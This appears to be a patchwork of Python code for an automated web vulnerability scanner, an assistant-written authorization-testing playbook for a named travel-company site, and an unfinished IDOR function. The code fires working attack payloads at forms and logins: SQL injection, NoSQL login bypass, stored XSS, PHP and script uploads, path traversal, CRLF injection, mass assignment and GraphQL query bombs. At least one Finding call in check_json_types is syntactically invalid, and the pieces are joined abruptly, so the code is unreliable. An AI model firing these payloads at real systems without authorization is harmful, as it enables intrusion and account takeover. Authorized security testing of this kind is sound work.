1. Multipart helper + stored-payload infrastructure
Add after build_points:

python
# ---- phase 3: multipart and stored payloads ----------------------------

def _multipart(fields, files):
    """files = {name: (filename, bytes, mime)}"""
    boundary = "----wp" + rand_token("", 14)
    body = b""
    for name, value in fields.items():
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        body += str(value).encode() + b"\r\n"
    for name, (fname, content, mime) in files.items():
        body += f"--{boundary}\r\n".encode()
        body += (f'Content-Disposition: form-data; name="{name}"; '
                 f'filename="{fname}"\r\n').encode()
        body += f"Content-Type: {mime}\r\n\r\n".encode()
        body += content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return body, f"multipart/form-data; boundary={boundary}"


def _find_upload_forms(ctx):
    out = []
    for page in ctx.pages:
        for f in page["forms"]:
            has_file_field = any(
                k.lower() in ("file", "upload", "image", "photo", "avatar",
                              "document", "attachment", "picture")
                for k in f["inputs"])
            if "multipart" in f.get("enctype", "") or has_file_field:
                out.append((page["url"], f))
    return out


STORAGE_HINT_RE = re.compile(
    r"(?i)(review|comment|feedback|contact|message|profile|bio|about|notes|"
    r"description|address|name|booking|inquiry|query|subject)")
SQL_PLANT_PAYLOAD = "wp'test"          # unique + quote metachar
XSS_PLANT_PAYLOAD = "<svg/onload=alert('{m}')>"


def _storage_forms(ctx):
    """Forms that plausibly write user-controlled data which is later rendered."""
    out = []
    for page in ctx.pages:
        for f in page["forms"]:
            if f["method"] != "POST" or "multipart" in f.get("enctype", ""):
                continue
            text_fields = {k: v for k, v in f["inputs"].items()
                           if any(STORAGE_HINT_RE.search(k) for k in (k,))
                           and not LOGIN_PASS_RE.search(k)}
            if text_fields:
                out.append((page["url"], f, list(text_fields)))
    return out


def _submit_form(client, source_url, f, overrides, extra_headers=None):
    params = dict(f["inputs"])
    params.update(overrides)
    params = _refresh_csrf(client, source_url, f, params)
    r = client.fetch(f["action"], "POST", urllib.parse.urlencode(params),
                     headers=extra_headers or {}, follow=True)
    return r


def _view_urls(ctx, source_url, f):
    """Pages likely to render stored data: the source page, its action, and
    same-host listing routes derived from the route name."""
    out = [source_url]
    path = urllib.parse.urlsplit(f["action"]).path
    base = path.rsplit("/", 1)[0]
    for child in ("", "/list", "/view", "/all", "/mine", "/admin"):
        out.append(ctx.root + base + child)
    return list(dict.fromkeys(out))
2. SQLi — UNION, stacked, second-order
python
# =========================================================================== #
# PHASE 3 - extended injection
# =========================================================================== #

def check_sqli_union(ctx, point):
    """A2 - UNION-based SQLi with bounded column counting."""
    base = point.send(ctx.http, point.params.get(point.target, ""))
    if base is None:
        return []
    marker = rand_token("wpu", 8)
    cols = None
    for n in range(1, 12):
        for comment in ("-- -", "#"):
            r = point.send(ctx.http, f"' ORDER BY {n}{comment}")
            if r is None or r.status >= 500:
                continue
            rn = point.send(ctx.http, f"' ORDER BY {n+1}{comment}")
            if rn is None:
                continue
            if r.status < 400 and (rn.status >= 400 or
                                   abs(len(rn.body) - len(r.body)) > 30):
                cols = n
                break
        if cols:
            break
    if not cols:
        return []
    for comment in ("-- -", "#"):
        for i in range(cols):
            parts = ["NULL"] * cols
            parts[i] = f"'{marker}'"
            p = f"' UNION SELECT {','.join(parts)}{comment}"
            r = point.send(ctx.http, p)
            if r is not None and marker in r.text:
                return [Finding(
                    "sqli", "high", "SQL injection (UNION-based)",
                    point.action, point.method, point.target, p,
                    evidence=f"marker reflected at column {i+1} of {cols}",
                    remediation="Parameterize queries; limit DB role privileges so "
                                "UNION extraction is not useful.",
                    phase=3)]
    return []


def check_sqli_stacked(ctx, point):
    """A5 - stacked statements (opt-in: requires --time-based)."""
    if not ctx.args.time_based:
        return []
    base = point.send(ctx.http, point.params.get(point.target, ""))
    if base is None or base.elapsed > 2.0:
        return []
    for p in ("'; SELECT pg_sleep(5)-- -",
              "'; WAITFOR DELAY '0:0:5'-- -",
              "'; SELECT SLEEP(5)-- -"):
        t0 = time.monotonic()
        r = point.send(ctx.http, p)
        if r is None:
            continue
        if time.monotonic() - t0 >= 4.5:
            return [Finding(
                "sqli", "critical", "SQL injection (stacked queries)",
                point.action, point.method, point.target, p,
                evidence=f"delay {time.monotonic() - t0:.1f}s",
                remediation="Disable multi-statement execution in the DB driver "
                            "and parameterize all queries.",
                phase=3)]
    return []


def check_sqli_second_order(ctx):
    """A6 - plant a quote metachar, then trigger views; look for SQL errors."""
    if not ctx.args.second_order:
        return []
    out = []
    plant = f"wp{rand_token('', 6)}'"     # unique + break quote
    for source_url, f, text_fields in _storage_forms(ctx)[:5]:
        overrides = {k: plant for k in text_fields}
        submit = _submit_form(ctx.http, source_url, f, overrides)
        if submit is None or submit.status >= 500:
            continue
        for view in _view_urls(ctx, source_url, f):
            r = ctx.http.fetch(view, follow=True)
            if r is None:
                continue
            m = SQL_ERROR_RE.search(r.text)
            if m:
                out.append(Finding(
                    "sqli", "critical",
                    "SQL injection (second-order)", view,
                    evidence=f"stored payload from {source_url} triggered "
                             f"'{clip(m.group(0), 80)}' on read-back",
                    remediation="Parameterize every query that reads stored data, "
                                "not just the insert. Validate on write AND read.",
                    confidence="medium", phase=3))
                break
        if out:
            break
    return out
3. NoSQL — type confusion and auth bypass
python
def check_nosql_types(ctx, point):
    """B2 - array/object/null/bool where scalar expected."""
    if point.kind != "form":
        return []
    base = point.send(ctx.http, point.params.get(point.target, ""))
    if base is None:
        return []
    fragments = [
        ("array",   f"{point.target}[]=wpa"),
        ("object",  f"{point.target}[a]=wpb"),
        ("null",    f"{point.target}=null"),
        ("bool",    f"{point.target}=true"),
        ("number",  f"{point.target}=99999999999999999999"),
    ]
    for label, frag in fragments:
        if point.method == "GET":
            sep = "&" if "?" in point.action else "?"
            r = ctx.http.fetch(point.action + sep + frag, follow=False)
        else:
            body = urllib.parse.urlencode(point._refresh(ctx.http))
            r = ctx.http.fetch(point.action, "POST", body + "&" + frag, follow=False)
        if r is None:
            continue
        if r.status >= 500 and re.search(
                r"(?i)(typeerror|type error|cannot read|expected|cast|"
                r"validation|invalid type|array|object)", r.text):
            return [Finding(
                "nosql", "medium", f"Type confusion accepted ({label})",
                point.action, point.method, point.target, frag,
                evidence=f"HTTP {r.status}: {clip(r.text, 160)}",
                remediation="Enforce JSON schema / strict type validation and "
                            "reject arrays/objects where scalars are expected.",
                phase=3)]
    return []


def check_nosql_authbypass(ctx):
    """B3 - MongoDB operator bypass in login form."""
    page_url, f = find_login_form(ctx)
    if not f or not ctx.args.test_email:
        return []
    out = []
    # Classic bypass: send operator in the user field, valid-looking pass.
    for op in ("$ne", "$gt", "$nin", "$regex"):
        params = dict(f["inputs"])
        for k in params:
            if LOGIN_USER_RE.search(k) and not LOGIN_PASS_RE.search(k):
                params[k] = f'{{"{op}": "wpnope"}}' if op != "$regex" else '{"$regex": ".*"}'
            elif LOGIN_PASS_RE.search(k):
                params[k] = "wpnope"
        body = urllib.parse.urlencode(params)
        # also try JSON-content-type variants
        for ctype_body, headers in [
            (body, {}),
            (json.dumps({k: ({op: "wpnope"} if LOGIN_USER_RE.search(k) and
                              not LOGIN_PASS_RE.search(k) else "wpnope")
                         for k in params}),
             {"Content-Type": "application/json"}),
        ]:
            r = ctx.http.fetch(f["action"], "POST", ctype_body, headers=headers,
                              follow=True)
            if r is None or r.status >= 400:
                continue
            if not re.search(r"(?i)(invalid|incorrect|wrong|failed|denied)",
                             r.text[:3000]):
                out.append(Finding(
                    "nosql", "critical",
                    f"NoSQL authentication bypass via {op}", f["action"],
                    method="POST",
                    payload=f"{LOGIN_USER_RE.pattern} = {{{op}: ...}}",
                    evidence=f"HTTP {r.status} without rejection markers; "
                             f"final URL: {r.url}",
                    remediation="Cast login fields to string before querying; "
                                "reject keys beginning with '$'.",
                    confidence="medium", phase=3))
                return out
    return out
4. XSS — stored, DOM, CSP effectiveness
python
def check_xss_stored(ctx):
    """C2/C5 - stored XSS: plant marker payload, check any read-back view."""
    if not ctx.args.stored_xss:
        return []
    out = []
    marker = rand_token("wp", 10)
    payload = XSS_PLANT_PAYLOAD.format(m=marker)
    for source_url, f, text_fields in _storage_forms(ctx)[:6]:
        overrides = {k: payload for k in text_fields}
        submit = _submit_form(ctx.http, source_url, f, overrides)
        if submit is None or submit.status >= 500:
            continue
        for view in _view_urls(ctx, source_url, f):
            r = ctx.http.fetch(view, follow=True)
            if r is None:
                continue
            if payload in r.text:
                out.append(Finding(
                    "xss", "high", "Stored cross-site scripting", view,
                    evidence=f"payload from form at {source_url} rendered unencoded "
                             f"on read-back (marker {marker})",
                    remediation="Context-aware output encoding on every render; "
                                "strict CSP without unsafe-inline.",
                    phase=3))
                break
        if out:
            break
    return out


DOM_SINK_RE = re.compile(
    r"(?i)(\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|"
    r"\.insertAdjacentHTML\s*\(|\beval\s*\(|new\s+Function\s*\(|"
    r"setTimeout\s*\(\s*['\"])")
DOM_SOURCE_RE = re.compile(
    r"(?i)(location\.(?:hash|search|href|pathname)|"
    r"document\.(?:URL|documentURI|referrer)|"
    r"window\.name)")


def check_xss_dom(ctx):
    """C3 - static source-to-sink analysis on client bundles."""
    out = []
    js_urls = [s for p in ctx.pages for s in p.get("scripts", [])
               if s.startswith("http")][:ctx.args.max_js]
    if not js_urls:
        return out
    for src in js_urls:
        r = ctx.http.fetch(src, follow=True)
        if r is None or r.status != 200 or len(r.body) > 5_000_000:
            continue
        text = r.text
        sinks = list(DOM_SINK_RE.finditer(text))
        sources = list(DOM_SOURCE_RE.finditer(text))
        if sinks and sources:
            # Very rough: report count, not line numbers, to avoid noise
            out.append(Finding(
                "xss", "low",
                "DOM XSS: source and sink both present in a client bundle",
                src,
                evidence=f"{len(sources)} source reference(s) to location/document "
                         f"and {len(sinks)} dangerous sink(s) in the same bundle",
                remediation="Assign with textContent / createElement / DOMPurify; "
                            "never place untrusted values from location.* into "
                            "innerHTML or eval.",
                confidence="low", phase=3))
    return out


def check_csp_effective(ctx):
    """C6 - whether the CSP actually blocks inline script."""
    r = ctx.http.fetch(ctx.base_url, follow=True)
    if r is None:
        return []
    csp = r.header("Content-Security-Policy")
    if not csp:
        return [Finding(
            "csp", "high", "No Content-Security-Policy", r.url,
            evidence="CSP header absent; inline script is unrestricted",
            remediation="Deploy a strict CSP with nonces or hashes; avoid "
                        "'unsafe-inline' and 'unsafe-eval'.",
            phase=3)]
    csp_l = csp.lower()
    weak = []
    if "'unsafe-inline'" in csp_l and "nonce-" not in csp_l:
        weak.append("unsafe-inline without nonce")
    if "'unsafe-eval'" in csp_l:
        weak.append("unsafe-eval")
    if "script-src" not in csp_l and "default-src" not in csp_l:
        weak.append("no script-src / default-src directive")
    if "*" in csp_l and "script-src" in csp_l:
        weak.append("wildcard in script-src")
    if weak:
        return [Finding(
            "csp", "medium", "CSP does not meaningfully restrict inline script",
            r.url, evidence=f"CSP header: {clip(csp, 200)}; issues: "
                            f"{', '.join(weak)}",
            remediation="Replace 'unsafe-inline' with nonces or hashes; remove "
                        "'unsafe-eval'; use 'strict-dynamic'.",
            phase=3)]
    return []
5. File upload — E1 through E5 + C4
python
TEST_FILES = [
    ("shell.php", b"<?php echo 'wpupload'; ?>", "application/x-php"),
    ("xss.svg", b"<svg xmlns='http://www.w3.org/2000/svg' onload=\"alert(1)\"/>",
     "image/svg+xml"),
    ("page.html", b"<html><script>alert(1)</script></html>", "text/html"),
    ("traverse.jpg", b"JFIF\x00wpupload", "image/jpeg"),
    ("evil.png", b"<script>alert(1)</script>", "image/png"),
]

TRAVERSAL_NAMES = ["../wp.png", "..\\wp.png", "....//wp.png",
                   "%2e%2e%2fwp.png", "../../../../tmp/wp.png"]


def check_upload(ctx):
    """E1-E5 + C4 - bounded upload probes against discovered forms."""
    forms = _find_upload_forms(ctx)
    if not forms:
        return []
    out = []
    for source_url, f in forms[:3]:
        # Identify the file field
        file_field = None
        for k in f["inputs"]:
            if k.lower() in ("file", "upload", "image", "photo", "avatar",
                             "document", "attachment", "picture"):
                file_field = k
                break
        if file_field is None:
            continue
        extra = {k: v for k, v in f["inputs"].items() if k != file_field}

        # E1/C4: try executable + SVG/HTML types
        for fname, content, mime in TEST_FILES[:3]:
            body, ctype = _multipart(extra, {file_field: (fname, content, mime)})
            r = ctx.http.fetch(f["action"], "POST", body,
                               headers={"Content-Type": ctype}, follow=True)
            if r is None:
                continue
            accepted = r.status < 400 and not re.search(
                r"(?i)(invalid|not allowed|forbidden|rejected|unsupported|"
                r"bad file|invalid type)", r.text[:3000])
            if not accepted:
                continue
            # Try to find the URL of the uploaded file
            loc = None
            m = re.search(r'(?:src|href)="([^"]+\.(?:php|svg|html|png|jpg|jpeg))"',
                          r.text)
            if m:
                loc = urllib.parse.urljoin(r.url, m.group(1))
            if loc:
                served = ctx.http.fetch(loc, follow=True)
                if served is not None:
                    ct = served.content_type
                    exec_note = ""
                    if fname.endswith(".php") and "wpupload" in served.text:
                        out.append(Finding(
                            "upload", "critical",
                            "Uploaded PHP file executed by the server", loc,
                            evidence=f"response contains file output "
                                     f"'wpupload' after upload of {fname}",
                            remediation="Store uploads outside the web root; "
                                        "serve via a handler that forces a safe "
                                        "Content-Type; disable script execution "
                                        "in the upload directory.",
                            phase=3))
                        continue
                    if fname.endswith((".svg", ".html")) and "text/html" in ct:
                        out.append(Finding(
                            "upload", "high",
                            "Uploaded HTML/SVG served with text/html",
                            loc,
                            evidence=f"file {fname} served as {ct}",
                            remediation="Force Content-Disposition: attachment "
                                        "and a non-executable Content-Type.",
                            phase=3))
                        continue
            out.append(Finding(
                "upload", "medium", "Dangerous file type accepted",
                f["action"], method="POST", payload=fname,
                evidence=f"upload of {fname} ({mime}) accepted: "
                         f"HTTP {r.status}",
                remediation="Validate file type by content (magic bytes), "
                            "not extension; restrict to expected MIME types.",
                phase=3))
            break

        # E2: path traversal in filename
        body, ctype = _multipart(extra, {
            file_field: ("legit.jpg", b"JFIF\x00wp", "image/jpeg")})
        for tname in TRAVERSAL_NAMES:
            body, ctype = _multipart(extra, {
                file_field: (tname, b"JFIF\x00wptrav", "image/jpeg")})
            r = ctx.http.fetch(f["action"], "POST", body,
                               headers={"Content-Type": ctype}, follow=True)
            if r is None:
                continue
            if r.status < 400 and not re.search(
                    r"(?i)(invalid|forbidden|rejected)", r.text[:2000]):
                # Try to fetch the traversed path
                probe = ctx.root + "/wp.png"
                if "tmp/" in tname:
                    continue  # hard to verify without filesystem access
                rr = ctx.http.fetch(probe, follow=True)
                if rr is not None and rr.status == 200 and b"wptrav" in rr.body:
                    out.append(Finding(
                        "upload", "high",
                        "Path traversal via upload filename", f["action"],
                        method="POST", payload=tname,
                        evidence=f"upload with filename {tname!r} resulted in "
                                 f"file accessible at {probe}",
                        remediation="Generate random storage names; discard the "
                                    "client-supplied filename entirely.",
                        phase=3))
                    break
        break  # only test one upload form
    return out
6. CRLF and broader host-header
python
CRLF_PAYLOADS = [
    "%0d%0aX-Wp-Injected: 1",
    "\r\nX-Wp-Injected: 1",
    "%0d%0a%0d%0a<wpcrlf>",
    "\r\n\r\n<wpcrlf>",
]


def check_crlf(ctx, point):
    """F1 - CRLF / response splitting."""
    base = point.send(ctx.http, "wpbase")
    if base is None:
        return []
    marker = "wpcrlf" + rand_token("", 6)
    for p in (f"%0d%0aX-Wp-Injected%3a+{marker}",
              f"\r\nX-Wp-Injected: {marker}",
              f"%0d%0a%0d%0a<body>{marker}</body>"):
        url, method, data = point.build(ctx.http, p)
        # Use raw socket so urllib doesn't normalize the payload
        if method == "GET":
            host, port, tls, path = split_host(url)
            req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: {UA}\r\nConnection: close\r\n\r\n").encode()
        else:
            req = build_raw_request(url, "POST",
                                    {"Content-Type": "application/x-www-form-urlencoded"},
                                    data or b"")
        raw = raw_request(url, req, ctx.args.insecure, timeout=6.0)
        if not raw:
            continue
        head, _, body = raw.partition(b"\r\n\r\n")
        if marker in head.decode("utf-8", "replace"):
            return [Finding(
                "crlf", "high",
                "CRLF injection: attacker-controlled header", point.action,
                point.method, point.target, p,
                evidence=f"marker {marker!r} appeared in the response headers",
                remediation="Reject CR/LF in any input that reaches a response "
                            "header; use a framework that escapes headers.",
                phase=3)]
        if marker in body.decode("utf-8", "replace"):
            return [Finding(
                "crlf", "medium",
                "Response splitting / body injection via CRLF", point.action,
                point.method, point.target, p,
                evidence=f"marker {marker!r} appeared in the body after CRLF "
                         f"payload",
                remediation="Same as above; sanitize on output.",
                phase=3)]
    return []


HOST_INJECT_MARKER = re.compile(r"(?i)<host>|<body>|wp-host")


def check_host_header_injection(ctx):
    """F2 - broader host-header injection than the reset-only check."""
    out = []
    canary = f"wphost{rand_token('', 6)}.example"
    for h in ("Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server"):
        r = ctx.http.fetch(ctx.base_url, headers={h: canary}, follow=False)
        if r is None:
            continue
        if canary in r.text or canary in r.url:
            body_has_link = bool(re.search(rf'(?:href|src|action)="[^"]*{re.escape(canary)}',
                                           r.text))
            out.append(Finding(
                "host", "medium",
                f"Host header reflected ({h})", r.url,
                payload=f"{h}: {canary}",
                evidence=("reflected in body links" if body_has_link
                          else f"canary {canary!r} present in response"),
                remediation="Use a single canonical base URL from server config; "
                            "ignore Host and X-Forwarded-Host for URL generation.",
                phase=3))
    return out
7. Mass assignment, JSON type tampering, GraphQL depth
python
MASS_ASSIGN_FIELDS = ["role", "is_admin", "is_staff", "admin", "verified",
                      "email_verified", "credits", "balance", "tier", "plan",
                      "subscription", "permissions", "owner", "user_id"]


def check_mass_assignment(ctx, point):
    """H2 - unexpected fields in update bodies."""
    if point.method != "POST":
        return []
    base = point.send(ctx.http, point.params.get(point.target, ""))
    if base is None:
        return []
    for field in MASS_ASSIGN_FIELDS[:8]:
        params = dict(point._refresh(ctx.http))
        params[field] = "true" if field in ("role",) else "999"
        r = point.send_params(ctx.http, params)
        if r is None:
            continue
        # Detect behavioural change vs baseline (403 would be correct)
        if r.status < 400 and field in r.text:
            # Narrow: field reflected with our value, e.g. "role": "true"
            if re.search(rf'"{field}"\s*:\s*(?:"?true"?|999)', r.text) or \
               re.search(rf"{field}['\"]?\s*[:=]\s*(?:'?true'?|999)", r.text):
                return [Finding(
                    "mass-assign", "high",
                    f"Mass assignment accepted field '{field}'",
                    point.action, point.method, point.target,
                    payload=f"{field}={params[field]}",
                    evidence=f"server reflected {field} with our value",
                    remediation="Use a strict allowlist (DTO) for every update; "
                                "never bind arbitrary request keys into models.",
                    confidence="medium", phase=3)]
    return []


def check_json_types(ctx, point):
    """H1 - JSON type tampering (null, array, object) where scalar expected."""
    if point.method != "POST":
        return []
    base = point.send(ctx.http, point.params.get(point.target, ""))
    if base is None:
        return []
    for label, val in (("null", None), ("array", [1]), ("object", {"a": 1}),
                       ("bool", True), ("number", 99999999999)):
        params = dict(point._refresh(ctx.http))
        params[point.target] = val
        try:
            body = json.dumps(params)
        except (TypeError, ValueError):
            continue
        r = ctx.http.fetch(point.action, "POST", body,
                           headers={"Content-Type": "application/json"},
                           follow=True)
        if r is None:
            continue
        if r.status >= 500 and re.search(
                r"(?i)(unexpected|typeerror|type error|cannot read|"
                r"cast|validation|invalid)", r.text):
            return [Finding(
                "json-type", "medium",
                f"Unvalidated JSON type: {label}", point.action, method="POST",
                point.target, payload=label,
                evidence=f"HTTP {r.status}: {clip(r.text, 160)}",
                remediation="Validate every field with a JSON schema; reject "
                            "nulls/arrays/objects where scalars are required.",
                phase=3)]
    return []


DEEP_QUERY_MAX_DEPTH = 12
FIELD_BOMB_REPEAT = 200


def check_graphql_depth(ctx):
    """H3 - query depth / complexity limits."""
    out = []
    candidates = [e for e in ctx.endpoints if "graphql" in e.lower()]
    candidates += ["/graphql", "/api/graphql"]
    for p in dict.fromkeys(candidates):
        url = urllib.parse.urljoin(ctx.base_url, p)
        # Determine a queryable object type
        intro = ctx.http.fetch(url, "POST",
                               json.dumps({"query": "{__schema{queryType{name}}}"}),
                               headers={"Content-Type": "application/json"})
        if intro is None or intro.status != 200 or "__schema" not in intro.text:
            continue
        # Nested aliases on __typename to force depth
        nested = "__typename"
        for _ in range(DEEP_QUERY_MAX_DEPTH):
            nested = f"{{__typename {nested}}}"
        r = ctx.http.fetch(url, "POST",
                           json.dumps({"query": f"{{ {nested} }}"}),
                           headers={"Content-Type": "application/json"})
        if r is not None and r.status == 200 and "errors" not in r.text[:2000]:
            out.append(Finding(
                "graphql", "medium",
                f"GraphQL accepts {DEEP_QUERY_MAX_DEPTH}-deep nested queries",
                url, method="POST",
                evidence="server returned data for a deeply nested query "
                         "without a depth error",
                remediation="Enforce max query depth and complexity cost; use "
                            "persisted queries.",
                phase=3))
        # Field repeat
        bomb = " ".join(f"f{i}:__typename" for i in range(FIELD_BOMB_REPEAT))
        rb = ctx.http.fetch(url, "POST", json.dumps({"query": f"{{ {bomb} }}"}),
                            headers={"Content-Type": "application/json"})
        if rb is not None and rb.status == 200 and "errors" not in rb.text[:2000]:
            out.append(Finding(
                "graphql", "medium",
                f"GraphQL accepts {FIELD_BOMB_REPEAT}-field query without "
                f"complexity limit", url, method="POST",
                evidence="server returned data for a wide aliased query",
                remediation="Set max query cost; reject oversized requests.",
                phase=3))
        break
    return out

Phase 4: Broken Access Control (Authorization) — Authorized Playbook

I can’t run live authorization testing against agraskbagheltourandtravels.com. What I can give you is the Phase 4 playbook that Sunil would execute only after Phase 1–3 are complete and the authorization is fully executed. This mirrors the Phase 1–3 structure.

---

0. Pre-engagement gate — do this before any request

· Confirm the authorization PDF is actually signed by Tarun Sisodia (handwritten or accepted e-signature) and countersigned by Sunil with full legal name and contact.
· Confirm page 3 asset register and operational fields are completed:
  · Exact API hostname/base paths, Supabase project ref/URL, Cloudflare/Render service IDs.
  · Rate limits (requests/second, concurrency, scan limits).
  · Testing hours (IST).
  · Test accounts and roles (customer, staff, admin as applicable; passwords stored separately).
  · Emergency contact, report channel, evidence retention period.
· Confirm Phase 1–3 are complete: asset map, auth/session posture, injection posture known; test accounts work.
· Confirm at least two roles of test accounts are provisioned (e.g., customer and admin/staff) if role-based testing is in scope.
· Confirm written approval that admin.agraskbagheltourandtravels.com is active and company-controlled, if it will be tested.
· Confirm DeepSeek usage is limited to sanitized snippets/synthetic data; no production credentials, tokens, PII, or payment data are submitted to hosted DeepSeek.
· If any item is missing, Phase 4 remains on hold. Do not send authorization-boundary requests.

---

1. Objective and scope confirmation

Objective: Validate that users can only access resources and perform actions permitted by their role, and that server-side authorization is enforced consistently across UI, API, and business workflows.

In-scope surfaces (per asset register and Phase 1 entry-point map):

· Customer frontend routes and API calls.
· Admin/staff frontend routes and API calls (only if confirmed active and controlled).
· Booking, reservation, quote, fare, coupon, and payment-state workflows.
· User profile and account endpoints.
· Object references: booking_id, user_id, package_id, order_id, invoice_id, coupon_id, file_id.
· Role and permission checks in backend/API (company-developed).
· Supabase row-level security (RLS) policies, storage bucket policies, and functions — only for the company-owned project/resources listed in the asset register.
· Cloudflare/Render configuration only where explicitly listed and approved.

Out of scope unless separately approved: third-party payment processor systems, email provider systems, customer-owned devices, denial-of-service, destructive testing, real customer data, production data modification, lateral movement beyond listed assets.

---

2. Test case catalog

Execute only with test accounts, synthetic records, and within approved rate limits and testing hours.

A. Horizontal access control (same role, different user)

ID Test Method Expected secure behavior
A1 IDOR on booking references With test user A, access test user B’s booking_id via UI/API Denied; ownership enforced server-side
A2 IDOR on profile/account Change user_id in profile/account endpoints between test accounts Denied for other users
A3 IDOR on invoices/receipts Access another test user’s invoice/receipt IDs Denied
A4 IDOR on uploaded files Access another test user’s uploaded document/profile image Denied; storage policy enforced
A5 IDOR on reviews/content Access or modify another test user’s review/draft Denied
A6 IDOR on coupon usage Apply or inspect another test user’s coupon/redemption Denied; coupon bound correctly

B. Vertical access control (role escalation)

ID Test Method Expected secure behavior
B1 Customer → admin route Request admin URLs directly with customer test account Denied or redirected
B2 Customer → admin API Call admin/staff API endpoints with customer token Server-side role check enforced
B3 Staff → admin action Attempt admin-only actions with staff test account (if applicable) Denied per role matrix
B4 Forced browsing Enumerate admin/staff paths from Phase 1 map with customer account Denied
B5 UI-only enforcement Bypass hidden/disabled UI controls; replay request via API Backend enforces authorization
B6 Role parameter tampering Modify role/claims in test request body/headers Rejected; server derives role from trusted source

C. Context-dependent and business-logic authorization

ID Test Method Expected secure behavior
C1 Booking state transitions Attempt invalid transitions (e.g., cancel after completion) with test bookings State machine enforced
C2 Coupon/pricing authorization Apply restricted coupons or manipulate pricing fields with test accounts Server recomputes; restrictions enforced
C3 Payment-state tampering Modify payment status/amount fields in test requests Server validates with payment provider; no trust in client
C4 Refund/cancellation authorization Attempt refund/cancel on another test user’s booking Denied
C5 Multi-tenant boundary (if applicable) Access another tenant’s test records, if tenancy exists Denied; tenant isolation enforced
C6 Workflow bypass Skip required steps (e.g., payment) in test booking flow Server enforces sequence

D. Supabase RLS and storage policies (only if in asset register)

ID Test Method Expected secure behavior
D1 RLS on tables With test user tokens, query/update rows owned by another test user Denied by RLS
D2 RLS bypass via functions Call company functions with test tokens to access other test rows Denied; function security definer/invoker reviewed
D3 Storage bucket policies Access another test user’s file path in approved bucket Denied
D4 Anon vs authenticated access Compare anon key vs test user token access to in-scope resources Least privilege enforced
D5 Policy gap review Review policies for USING/WITH CHECK gaps using test data only Policies cover read/write appropriately

E. API and method-level authorization

ID Test Method Expected secure behavior
E1 Missing auth on endpoint Call in-scope API endpoints without token 401/403
E2 Method tampering Change GET→POST/PUT/DELETE on test endpoints Method-level auth enforced
E3 Mass assignment on role/owner fields Add role, owner_id, user_id to test update requests Allowlist enforced; fields ignored/rejected
E4 GraphQL/RPC authorization (if used) Query/mutate other test users’ data via in-scope GraphQL/RPC Resolver-level authorization enforced
E5 CORS misconfiguration Test cross-origin requests from a controlled test origin CORS restricted to approved origins

F. Forced browsing and information disclosure

ID Test Method Expected secure behavior
F1 Directory/file enumeration Bounded enumeration of admin/staff paths with test account No sensitive files/routes exposed
F2 Backup/config exposure Check for common exposed files (.env, backups) only via approved, bounded checks Not exposed
F3 Error message leakage Trigger authorization errors with test requests Generic errors; no internal details
F4 Verbose API responses Inspect test API responses for excessive data Least data returned

---

3. Execution rules and rate limits

· Use test accounts and synthetic records only; never real customer data.
· Respect approved rate limits, concurrency, and testing hours.
· No automated exploitation at scale, no destructive payloads, no DoS.
· Do not modify real bookings, payments, refunds, or customer records.
· Stop immediately if:
  · Service stability is affected.
  · Real user data is exposed.
  · Another tenant/customer is affected.
  · An out-of-scope system is reached.
  · A test action risks financial impact.
· Preserve minimal sanitized evidence and notify the emergency contact.
· Keep a dated activity log with timestamps, endpoints, test IDs, role used, and results.

---

4. Tools and evidence handling

· Burp Suite (Community/Pro) or OWASP ZAP for intercepting and replaying requests across test roles.
· Browser DevTools for UI vs API comparison and hidden control testing.
· curl for controlled token/role tests.
· Supabase dashboard/SQL only for reviewing RLS policies using test data and approved access; no production exports.
· Custom scripts for bounded IDOR enumeration using test IDs — must respect approved limits.
· Redact credentials, tokens, cookies, PII, and unrelated data from screenshots/logs.
· Do not submit production credentials, tokens, PII, or payment data to hosted DeepSeek; use sanitized snippets or synthetic data.

---

5. Deliverables and exit criteria

Deliverables:

1. Test case execution matrix (Pass/Fail/Blocked) with evidence references.
2. Findings for each failed test: affected asset, authorization flaw class (IDOR, vertical escalation, missing auth, RLS gap, etc.), severity rationale, prerequisites, minimal reproduction steps with test accounts, impact, sanitized evidence, remediation (server-side checks, RLS policies, allowlists, ownership validation).
3. Role/permission matrix observed vs expected.
4. Confirmation that no production data was accessed or modified.
5. Phase 5 readiness note: confirmed authorization posture and any blockers.

Exit criteria:

· All approved test cases are executed or explicitly blocked with reason.
· Findings are documented and privately reported via the approved channel.
· No production data or real user accounts were accessed or modified.
· Activity log and sanitized evidence are retained per the agreed period.

ID_PATTERNS = {
    "booking": re.compile(r"(?i)\b(?:booking|reservation)[_\-]?(?:id|ref|number)?['\"]?\s*[:=]\s*['\"]?([A-Z0-9]{3,})"),
    "order": re.compile(r"(?i)\border(?:[_\-]?id)['\"]?\s*[:=]\s*['\"]?([A-Z0-9]{3,})"),
    "invoice": re.compile(r"(?i)\binvoice(?:[_\-]?id|[_\-]?no|[_\-]?number)?['\"]?\s*[:=]\s*['\"]?([A-Z0-9]{3,})"),
    "coupon": re.compile(r"(?i)\bcoupon(?:[_\-]?(?:code|id))?['\"]?\s*[:=]\s*['\"]?([A-Z0-9]{3,})"),
    "file": re.compile(r"(?i)\bfile(?:[_\-]?id)['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{3,})"),
    "user": re.compile(r"(?i)\buser(?:[_\-]?id)['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{1,})"),
    "review": re.compile(r"(?i)\breview(?:[_\-]?id)['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{1,})"),
}

For the resource ID enumeration approach:

python
def _harvest_resource_ids(ctx, client):
    """Fetch authed pages, extract candidate IDs with their resource type."""
    ids = []
    for url in _authed_view_urls(ctx):
        r = client.fetch(url, follow=True)
        if r is None:
            continue
        for rtype, pattern in ID_PATTERNS.items():
            for m in pattern.finditer(r.text):
                ids.append((rtype, m.group(1), url))
    return list(dict.fromkeys(ids))

Let me write it:

python
def check_idor_multi(ctx):
    """A1-A5: multi-identity IDOR on resource IDs discovered in authed pages."""
    if not ctx.args.secondary_cookie:
        return []
    a = get_authed_client(ctx)
    if not a:
        return []
    b = ctx.http.clone(cookie=ctx.args.secondary_cookie)
    b_probe = b.fetch(ctx.base_url, follow=True)
    if b_probe is None:
        return []
    
    # First, harvest from A
    a_probe = a.fetch(ctx.base_url, follow=True)
    if a_probe is None:
        return []
    
